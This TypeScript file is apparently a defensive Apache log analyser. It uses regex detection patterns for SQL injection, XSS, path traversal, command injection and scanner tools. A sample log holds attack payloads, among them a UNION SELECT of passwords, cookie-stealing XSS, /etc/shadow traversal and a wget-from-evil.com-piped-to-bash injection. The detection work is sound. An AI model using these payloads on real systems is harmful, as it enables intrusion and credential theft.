export type LogCategory =
  | "brute-force"
  | "404-sweep"
  | "sqli"
  | "xss"
  | "path-traversal"
  | "cmd-injection"
  | "unusual-ua"
  | "info";

export type LogFinding = {
  id: string;
  category: LogCategory;
  severity: "critical" | "high" | "medium" | "low" | "info";
  title: string;
  description: string;
  mitre?: { technique: string; name: string; tactic: string };
  ip?: string;
  userAgent?: string;
  count: number;
  examples: string[];
};

export type TimelineBucket = {
  label: string;
  requests: number;
  errors: number;
};

type ParsedLogLine = {
  raw: string;
  ip?: string;
  method?: string;
  path?: string;
  status?: number;
  userAgent?: string;
  timestamp?: Date;
};

const APACHE_RE =
  /^(\S+)\s+\S+\s+\S+\s+\[([^\]]+)\]\s+"(\S+)\s+(\S+)\s+\S+"\s+(\d{3})\s+\S+(?:\s+"[^"]*"\s+"([^"]*)")?/;

const APACHE_DATE_RE = /(\d{2})\/(\w{3})\/(\d{4}):(\d{2}):(\d{2}):(\d{2})/;

const MONTH_MAP: Record<string, number> = {
  Jan: 0, Feb: 1, Mar: 2, Apr: 3, May: 4, Jun: 5,
  Jul: 6, Aug: 7, Sep: 8, Oct: 9, Nov: 10, Dec: 11,
};

function parseApacheDate(raw: string): Date | undefined {
  const m = raw.match(APACHE_DATE_RE);
  if (!m) return undefined;
  return new Date(
    Number(m[3]),
    MONTH_MAP[m[2]] ?? 0,
    Number(m[1]),
    Number(m[4]),
    Number(m[5]),
    Number(m[6]),
  );
}

function parseLine(line: string): ParsedLogLine {
  const m = line.match(APACHE_RE);
  if (m) {
    return {
      raw: line,
      ip: m[1],
      timestamp: parseApacheDate(m[2]),
      method: m[3],
      path: m[4],
      status: Number(m[5]),
      userAgent: m[6],
    };
  }
  const ipMatch = line.match(/(\d{1,3}(?:\.\d{1,3}){3})/);
  const statusMatch = line.match(/\s(\d{3})\s/);
  return {
    raw: line,
    ip: ipMatch?.[1],
    status: statusMatch ? Number(statusMatch[1]) : undefined,
  };
}

function decodeURIComponentSafe(s: string): string {
  try { return decodeURIComponent(s); } catch { return s; }
}

const SQLI_PATTERNS = [
  /union\s+select/i, /or\s+1\s*=\s*1/i, /'\s*or\s*'/i, /--\s*$/,
  /\bselect\b.*\bfrom\b/i, /\bsleep\s*\(/i, /benchmark\s*\(/i,
  /information_schema/i, /xp_cmdshell/i, /waitfor\s+delay/i,
  /load_file\s*\(/i, /into\s+outfile/i,
];

const XSS_PATTERNS = [
  /<script[\s>]/i, /javascript\s*:/i,
  /on(?:load|error|click|mouse\w+|key\w+|focus|blur)\s*=/i,
  /<img[^>]+src\s*=\s*['"]?javascript/i,
  /document\s*\.\s*cookie/i, /eval\s*\(/i,
  /<iframe/i, /expression\s*\(/i, /vbscript\s*:/i, /%3cscript/i,
];

const PATH_TRAVERSAL_PATTERNS = [
  /\.\.[/\\]/, /%2e%2e%2f/i, /%252e%252e/i, /\.\.%2f/i, /\.\.%5c/i,
  /\/etc\/passwd/i, /\/etc\/shadow/i, /\/proc\/self/i,
  /c:\\windows/i, /c:%5cwindows/i,
];

const CMD_INJECTION_PATTERNS = [
  /[;&|`]\s*(?:wget|curl|nc|ncat|bash|sh|cmd|powershell)/i,
  /\$\(.*?\)/, /`[^`]+`/, /\|\s*bash/i, /;\s*rm\s+-/i,
  /&&\s*(?:cat|id|whoami|uname|ls)/i, />\s*\/dev\/tcp\//,
];

const SUSPICIOUS_UA_PATTERNS = [
  { re: /sqlmap/i, label: "sqlmap" },
  { re: /nikto/i, label: "Nikto" },
  { re: /nmap/i, label: "Nmap" },
  { re: /masscan/i, label: "masscan" },
  { re: /metasploit/i, label: "Metasploit" },
  { re: /acunetix/i, label: "Acunetix" },
  { re: /nessus/i, label: "Nessus" },
  { re: /zgrab/i, label: "ZGrab" },
  { re: /\bcurl\/[\d.]+/i, label: "curl" },
  { re: /wget/i, label: "wget" },
  { re: /python-requests/i, label: "python-requests" },
  { re: /go-http-client/i, label: "Go HTTP client" },
  { re: /dirbuster/i, label: "DirBuster" },
  { re: /gobuster/i, label: "Gobuster" },
  { re: /wfuzz/i, label: "wfuzz" },
  { re: /hydra/i, label: "Hydra" },
];

const SENSITIVE_LOGIN_PATHS =
  /\/(login|signin|admin|wp-login\.php|user\/login|api\/login|auth)/i;

function severityRank(a: LogFinding, b: LogFinding) {
  const order = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
  return order[a.severity] - order[b.severity];
}

function buildTimeline(parsed: ParsedLogLine[]): TimelineBucket[] {
  const withTime = parsed.filter((p) => p.timestamp);
  if (withTime.length === 0) return [];
  const times = withTime.map((p) => p.timestamp!.getTime());
  const minT = Math.min(...times);
  const maxT = Math.max(...times);
  const range = maxT - minT;
  if (range === 0) return [];
  const BUCKET_COUNT = 12;
  const bucketSize = Math.ceil(range / BUCKET_COUNT) || 60000;
  const buckets: TimelineBucket[] = Array.from({ length: BUCKET_COUNT }, (_, i) => {
    const t = new Date(minT + i * bucketSize);
    const h = t.getHours().toString().padStart(2, "0");
    const m = t.getMinutes().toString().padStart(2, "0");
    return { label: `${h}:${m}`, requests: 0, errors: 0 };
  });
  for (const p of withTime) {
    const idx = Math.min(
      Math.floor((p.timestamp!.getTime() - minT) / bucketSize),
      BUCKET_COUNT - 1,
    );
    buckets[idx].requests++;
    if (p.status && p.status >= 400) buckets[idx].errors++;
  }
  return buckets;
}

export function analyzeLogs(text: string): {
  findings: LogFinding[];
  totalLines: number;
  parsedLines: number;
  perIp: { ip: string; count: number; errors: number }[];
  timeline: TimelineBucket[];
} {
  const lines = text.split(/\r?\n/).filter((l) => l.trim().length > 0);
  const parsed = lines.map(parseLine);
  const findings: LogFinding[] = [];

  // ---- Brute force ----
  const bfMap = new Map<string, { count: number; examples: string[] }>();
  for (const p of parsed) {
    if (!p.ip || !p.path) continue;
    if (SENSITIVE_LOGIN_PATHS.test(p.path)) {
      const entry = bfMap.get(p.ip) ?? { count: 0, examples: [] };
      entry.count++;
      if (entry.examples.length < 3) entry.examples.push(p.raw);
      bfMap.set(p.ip, entry);
    }
  }
  let bfIdx = 0;
  for (const [ip, info] of bfMap.entries()) {
    if (info.count >= 5) {
      findings.push({
        id: `bf-${bfIdx++}`,
        category: "brute-force",
        severity: info.count >= 25 ? "critical" : "high",
        title: `Brute force from ${ip}`,
        description: `${info.count} requests to login/auth endpoints from ${ip}.`,
        mitre: { technique: "T1110", name: "Brute Force", tactic: "Credential Access" },
        ip, count: info.count, examples: info.examples,
      });
    }
  }

  // ---- 404 sweep ----
  const sweep = new Map<string, { count: number; examples: string[]; paths: Set<string> }>();
  for (const p of parsed) {
    if (!p.ip || p.status !== 404) continue;
    const entry = sweep.get(p.ip) ?? { count: 0, examples: [], paths: new Set() };
    entry.count++;
    if (p.path) entry.paths.add(p.path);
    if (entry.examples.length < 3) entry.examples.push(p.raw);
    sweep.set(p.ip, entry);
  }
  let sweepIdx = 0;
  for (const [ip, info] of sweep.entries()) {
    if (info.count >= 8) {
      findings.push({
        id: `sweep-${sweepIdx++}`,
        category: "404-sweep",
        severity: info.count >= 30 ? "high" : "medium",
        title: `404 sweep from ${ip}`,
        description: `${info.count} not-found responses across ${info.paths.size} unique paths. Likely directory enumeration.`,
        mitre: { technique: "T1595.003", name: "Wordlist Scanning", tactic: "Reconnaissance" },
        ip, count: info.count, examples: info.examples,
      });
    }
  }

  // ---- SQL injection ----
  let sqliIdx = 0;
  const sqliByIp = new Map<string, { count: number; examples: string[] }>();
  for (const p of parsed) {
    if (!p.path) continue;
    if (SQLI_PATTERNS.some((re) => re.test(decodeURIComponentSafe(p.path!)))) {
      const ip = p.ip ?? "unknown";
      const entry = sqliByIp.get(ip) ?? { count: 0, examples: [] };
      entry.count++;
      if (entry.examples.length < 3) entry.examples.push(p.raw);
      sqliByIp.set(ip, entry);
    }
  }
  for (const [ip, info] of sqliByIp.entries()) {
    findings.push({
      id: `sqli-${sqliIdx++}`, category: "sqli", severity: "critical",
      title: `SQL injection attempts from ${ip}`,
      description: `${info.count} request(s) containing SQL injection signatures.`,
      mitre: { technique: "T1190", name: "Exploit Public-Facing Application", tactic: "Initial Access" },
      ip: ip === "unknown" ? undefined : ip, count: info.count, examples: info.examples,
    });
  }

  // ---- XSS ----
  let xssIdx = 0;
  const xssByIp = new Map<string, { count: number; examples: string[] }>();
  for (const p of parsed) {
    if (!p.path) continue;
    if (XSS_PATTERNS.some((re) => re.test(decodeURIComponentSafe(p.path!)))) {
      const ip = p.ip ?? "unknown";
      const entry = xssByIp.get(ip) ?? { count: 0, examples: [] };
      entry.count++;
      if (entry.examples.length < 3) entry.examples.push(p.raw);
      xssByIp.set(ip, entry);
    }
  }
  for (const [ip, info] of xssByIp.entries()) {
    findings.push({
      id: `xss-${xssIdx++}`, category: "xss", severity: "high",
      title: `XSS probing from ${ip}`,
      description: `${info.count} request(s) with cross-site scripting payloads in URL or parameters.`,
      mitre: { technique: "T1059.007", name: "JavaScript", tactic: "Execution" },
      ip: ip === "unknown" ? undefined : ip, count: info.count, examples: info.examples,
    });
  }

  // ---- Path traversal ----
  let ptIdx = 0;
  const ptByIp = new Map<string, { count: number; examples: string[] }>();
  for (const p of parsed) {
    if (!p.path) continue;
    if (PATH_TRAVERSAL_PATTERNS.some((re) => re.test(decodeURIComponentSafe(p.path!)))) {
      const ip = p.ip ?? "unknown";
      const entry = ptByIp.get(ip) ?? { count: 0, examples: [] };
      entry.count++;
      if (entry.examples.length < 3) entry.examples.push(p.raw);
      ptByIp.set(ip, entry);
    }
  }
  for (const [ip, info] of ptByIp.entries()) {
    findings.push({
      id: `pt-${ptIdx++}`, category: "path-traversal", severity: "critical",
      title: `Path traversal attempts from ${ip}`,
      description: `${info.count} request(s) with directory traversal sequences (../ or equivalent encoding).`,
      mitre: { technique: "T1083", name: "File and Directory Discovery", tactic: "Discovery" },
      ip: ip === "unknown" ? undefined : ip, count: info.count, examples: info.examples,
    });
  }

  // ---- Command injection ----
  let cmdIdx = 0;
  const cmdByIp = new Map<string, { count: number; examples: string[] }>();
  for (const p of parsed) {
    if (!p.path) continue;
    if (CMD_INJECTION_PATTERNS.some((re) => re.test(decodeURIComponentSafe(p.path!)))) {
      const ip = p.ip ?? "unknown";
      const entry = cmdByIp.get(ip) ?? { count: 0, examples: [] };
      entry.count++;
      if (entry.examples.length < 3) entry.examples.push(p.raw);
      cmdByIp.set(ip, entry);
    }
  }
  for (const [ip, info] of cmdByIp.entries()) {
    findings.push({
      id: `cmd-${cmdIdx++}`, category: "cmd-injection", severity: "critical",
      title: `Command injection attempts from ${ip}`,
      description: `${info.count} request(s) with OS command injection patterns.`,
      mitre: { technique: "T1059", name: "Command and Scripting Interpreter", tactic: "Execution" },
      ip: ip === "unknown" ? undefined : ip, count: info.count, examples: info.examples,
    });
  }

  // ---- Suspicious user agents ----
  let uaIdx = 0;
  const uaByLabel = new Map<string, { count: number; examples: string[]; ips: Set<string> }>();
  for (const p of parsed) {
    if (!p.userAgent) continue;
    for (const { re, label } of SUSPICIOUS_UA_PATTERNS) {
      if (re.test(p.userAgent)) {
        const entry = uaByLabel.get(label) ?? { count: 0, examples: [], ips: new Set<string>() };
        entry.count++;
        if (p.ip) entry.ips.add(p.ip);
        if (entry.examples.length < 3) entry.examples.push(p.raw);
        uaByLabel.set(label, entry);
        break;
      }
    }
  }
  for (const [label, info] of uaByLabel.entries()) {
    findings.push({
      id: `ua-${uaIdx++}`, category: "unusual-ua",
      severity: ["sqlmap", "Nikto", "masscan", "Acunetix", "Hydra", "Gobuster"].includes(label) ? "high" : "medium",
      title: `Suspicious user agent: ${label}`,
      description: `${info.count} requests using ${label} from ${info.ips.size} IP(s).`,
      mitre: { technique: "T1595.002", name: "Vulnerability Scanning", tactic: "Reconnaissance" },
      userAgent: label, count: info.count, examples: info.examples,
    });
  }

  const perIpMap = new Map<string, { count: number; errors: number }>();
  for (const p of parsed) {
    if (!p.ip) continue;
    const entry = perIpMap.get(p.ip) ?? { count: 0, errors: 0 };
    entry.count++;
    if (p.status && p.status >= 400) entry.errors++;
    perIpMap.set(p.ip, entry);
  }

  return {
    findings: findings.sort(severityRank),
    totalLines: lines.length,
    parsedLines: parsed.filter((p) => p.ip).length,
    perIp: Array.from(perIpMap.entries())
      .map(([ip, v]) => ({ ip, count: v.count, errors: v.errors }))
      .sort((a, b) => b.count - a.count)
      .slice(0, 25),
    timeline: buildTimeline(parsed),
  };
}

export const SAMPLE_APACHE_LOG = `192.168.1.10 - - [12/Apr/2026:08:15:01 +0000] "GET / HTTP/1.1" 200 1024 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.10 - - [12/Apr/2026:08:15:03 +0000] "GET /assets/style.css HTTP/1.1" 200 4112 "-" "Mozilla/5.0"
203.0.113.50 - - [12/Apr/2026:08:16:01 +0000] "GET /admin HTTP/1.1" 401 287 "-" "Mozilla/5.0"
203.0.113.50 - - [12/Apr/2026:08:16:02 +0000] "POST /admin/login HTTP/1.1" 401 287 "-" "Mozilla/5.0"
203.0.113.50 - - [12/Apr/2026:08:16:03 +0000] "POST /admin/login HTTP/1.1" 401 287 "-" "Mozilla/5.0"
203.0.113.50 - - [12/Apr/2026:08:16:04 +0000] "POST /admin/login HTTP/1.1" 401 287 "-" "Mozilla/5.0"
203.0.113.50 - - [12/Apr/2026:08:16:05 +0000] "POST /admin/login HTTP/1.1" 401 287 "-" "Mozilla/5.0"
203.0.113.50 - - [12/Apr/2026:08:16:06 +0000] "POST /admin/login HTTP/1.1" 401 287 "-" "Mozilla/5.0"
203.0.113.50 - - [12/Apr/2026:08:16:07 +0000] "POST /admin/login HTTP/1.1" 401 287 "-" "Mozilla/5.0"
203.0.113.50 - - [12/Apr/2026:08:16:08 +0000] "POST /admin/login HTTP/1.1" 401 287 "-" "Mozilla/5.0"
198.51.100.7 - - [12/Apr/2026:08:18:11 +0000] "GET /backup.zip HTTP/1.1" 404 162 "-" "Mozilla/5.0 sqlmap/1.7.2"
198.51.100.7 - - [12/Apr/2026:08:18:12 +0000] "GET /old/ HTTP/1.1" 404 162 "-" "Mozilla/5.0 sqlmap/1.7.2"
198.51.100.7 - - [12/Apr/2026:08:18:13 +0000] "GET /db.sql HTTP/1.1" 404 162 "-" "Mozilla/5.0 sqlmap/1.7.2"
198.51.100.7 - - [12/Apr/2026:08:18:14 +0000] "GET /config.php.bak HTTP/1.1" 404 162 "-" "Mozilla/5.0 sqlmap/1.7.2"
198.51.100.7 - - [12/Apr/2026:08:18:15 +0000] "GET /.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 sqlmap/1.7.2"
198.51.100.7 - - [12/Apr/2026:08:18:16 +0000] "GET /.git/config HTTP/1.1" 404 162 "-" "Mozilla/5.0 sqlmap/1.7.2"
198.51.100.7 - - [12/Apr/2026:08:18:17 +0000] "GET /wp-config.php HTTP/1.1" 404 162 "-" "Mozilla/5.0 sqlmap/1.7.2"
198.51.100.7 - - [12/Apr/2026:08:18:18 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 162 "-" "Mozilla/5.0 sqlmap/1.7.2"
198.51.100.7 - - [12/Apr/2026:08:18:19 +0000] "GET /server-status HTTP/1.1" 404 162 "-" "Mozilla/5.0 sqlmap/1.7.2"
198.51.100.7 - - [12/Apr/2026:08:18:20 +0000] "GET /test.php HTTP/1.1" 404 162 "-" "Mozilla/5.0 sqlmap/1.7.2"
45.33.19.22 - - [12/Apr/2026:08:21:01 +0000] "GET /products?id=1' OR 1=1-- HTTP/1.1" 500 412 "-" "Mozilla/5.0"
45.33.19.22 - - [12/Apr/2026:08:21:02 +0000] "GET /products?id=1 UNION SELECT username,password FROM users-- HTTP/1.1" 500 412 "-" "Mozilla/5.0"
45.33.19.22 - - [12/Apr/2026:08:21:03 +0000] "GET /search?q=test' OR '1'='1 HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
45.33.19.22 - - [12/Apr/2026:08:21:04 +0000] "GET /api/users?filter=1;SELECT%20sleep(5)-- HTTP/1.1" 500 412 "-" "Mozilla/5.0"
100.20.30.40 - - [12/Apr/2026:08:23:01 +0000] "GET /page?name=<script>alert(1)</script> HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
100.20.30.40 - - [12/Apr/2026:08:23:02 +0000] "GET /profile?bio=<img src=x onerror=alert(document.cookie)> HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
100.20.30.40 - - [12/Apr/2026:08:23:03 +0000] "GET /search?q=javascript:eval(atob('YWxlcnQoMSk=')) HTTP/1.1" 200 512 "-" "Mozilla/5.0"
55.66.77.88 - - [12/Apr/2026:08:25:01 +0000] "GET /download?file=../../../etc/passwd HTTP/1.1" 403 287 "-" "Mozilla/5.0"
55.66.77.88 - - [12/Apr/2026:08:25:02 +0000] "GET /read?path=..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1" 403 287 "-" "Mozilla/5.0"
99.11.22.33 - - [12/Apr/2026:08:27:01 +0000] "GET /api/ping?host=8.8.8.8;wget%20http://evil.com/shell.sh|bash HTTP/1.1" 500 412 "-" "Mozilla/5.0"
8.8.8.8 - - [12/Apr/2026:08:30:00 +0000] "GET / HTTP/1.1" 200 1024 "-" "Nikto/2.1.6"
8.8.8.8 - - [12/Apr/2026:08:30:01 +0000] "GET /robots.txt HTTP/1.1" 200 89 "-" "Nikto/2.1.6"
8.8.8.8 - - [12/Apr/2026:08:30:02 +0000] "GET /CHANGELOG HTTP/1.1" 404 162 "-" "Nikto/2.1.6"
192.168.1.10 - - [12/Apr/2026:08:35:00 +0000] "GET /about HTTP/1.1" 200 2014 "-" "Mozilla/5.0 (Macintosh)"
192.168.1.10 - - [12/Apr/2026:08:35:05 +0000] "GET /contact HTTP/1.1" 200 1893 "-" "Mozilla/5.0 (Macintosh)"
`;
